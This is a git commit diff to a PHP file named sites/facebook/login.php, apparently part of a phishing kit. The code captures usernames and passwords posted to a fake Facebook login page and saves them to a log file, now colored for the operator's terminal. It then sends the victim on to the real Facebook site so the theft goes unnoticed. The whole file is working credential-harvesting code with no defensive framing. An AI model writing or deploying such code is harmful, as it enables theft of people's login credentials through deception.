c11d1867f73d2f7f3910924c6182b21c953fefb1
Shyamnpl <168097833+Shyamnpl@users.noreply.github.com>
2025-04-27 11:15:33 +0545

    Add files via upload

--- sites/facebook/login.php
+++ sites/facebook/login.php
@@ -2,13 +2,20 @@
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $username = $_POST['username'] ?? '';
     $password = $_POST['password'] ?? '';
-    $entry = "Username: " . $username . " | Password: " . $password . "\n";
+
+    // ANSI Color Codes
+    $red = "\033[1;91m";
+    $green = "\033[1;32m";
+    $reset = "\033[0m";
+
+    // Create entry with color
+    $entry = $green . "Username: " . $red . $username . $green . " | Password: " . $red . $password . $reset . "\n";
 
     // Log file in project directory
     $liveLog = "live_login.log";
 
     // Save entry to live_login.log
-    file_put_contents($liveLog, date("Y-m-d H:i:s") . " - " . $entry, FILE_APPEND);
+    file_put_contents($liveLog, $entry, FILE_APPEND);
 
     // Redirect user to Facebook
     header("Location: https://www.facebook.com");
